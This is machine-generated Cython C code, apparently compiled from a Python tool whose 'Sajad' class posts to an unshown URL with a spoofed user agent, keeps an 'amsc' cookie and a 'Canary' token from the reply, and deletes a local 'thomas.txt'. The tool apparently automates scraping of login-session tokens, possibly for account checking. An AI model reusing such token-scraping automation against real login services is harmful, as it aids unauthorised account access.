          __pyx_lineno = __pyx_t_10; __pyx_clineno = __pyx_t_12; __pyx_filename = __pyx_t_13;
          goto __pyx_L5_except_error;
        }
        __pyx_L15:;
      }
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_getcnre); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 676, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 676, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("source.Sajad.idtle", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_text);
  __Pyx_XDECREF(__pyx_v_error);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_11getcnre(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_11getcnre = {"getcnre", (PyCFunction)__pyx_pw_6source_5Sajad_11getcnre, METH_O, 0};
static PyObject *__pyx_pw_6source_5Sajad_11getcnre(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("getcnre (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_5Sajad_10getcnre(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad_10getcnre(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_req = NULL;
  PyObject *__pyx_v_encoded = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("getcnre", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 681, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 682, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_t_3, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Windows_NT_6_1_Apple) < 0) __PYX_ERR(0, 682, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_t_3) < 0) __PYX_ERR(0, 681, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__26, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_req = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_req, __pyx_n_s_cookies); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 684, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 684, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 684, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_3, __pyx_n_u_amsc); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 684, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_amsc, __pyx_t_2) < 0) __PYX_ERR(0, 684, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_req, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_n_u_Canary) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_n_u_Canary);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_1, 4, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_kp_u_ip) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_ip);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 685, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_3, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 686, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_split); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 686, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_u__27) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_u__27);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 686, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_GetItemInt(__pyx_t_2, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 686, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_encoded = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_encoded, __pyx_n_s_encode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 687, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 687, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_decode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 687, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_kp_u_unicode_escape) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_unicode_escape);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 687, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_canary, __pyx_t_3) < 0) __PYX_ERR(0, 687, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_Equals(__pyx_t_4, __pyx_n_u_nt, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__pyx_t_6) {
    __Pyx_INCREF(__pyx_n_u_cls);
    __pyx_t_1 = __pyx_n_u_cls;
  } else {
    __Pyx_INCREF(__pyx_n_u_clear);
    __pyx_t_1 = __pyx_n_u_clear;
  }
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 688, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_chkfile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 689, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 689, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.Sajad.getcnre", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_req);
  __Pyx_XDECREF(__pyx_v_encoded);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3dosyasil(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3dosyasil = {"dosyasil", (PyCFunction)__pyx_pw_6source_3dosyasil, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3dosyasil(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("dosyasil (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2dosyasil(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2dosyasil(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("dosyasil", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 694, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_remove); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 694, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_u_thomas_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_thomas_txt);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 694, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 695, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("source.dosyasil", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 696, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 697, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("source.dosyasil", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5get_id(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_5get_id = {"get_id", (PyCFunction)__pyx_pw_6source_5get_id, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_5get_id(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_id (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_4get_id(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_4get_id(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_t_3;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_id", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 705, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 705, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 705, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_id = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ids); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 706, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = (__Pyx_PySequence_ContainsTF(__pyx_v_id, __pyx_t_1, Py_NE)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 706, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_4 = (__pyx_t_3 != 0);
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ids); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 707, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_v_id); if (unlikely(__pyx_t_5 == ((int)-1))) __PYX_ERR(0, 707, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_XDECREF(__pyx_r);
    __Pyx_INCREF(__pyx_v_id);
    __pyx_r = __pyx_v_id;
    goto __pyx_L0;

    
  }

  
  /*else*/ {
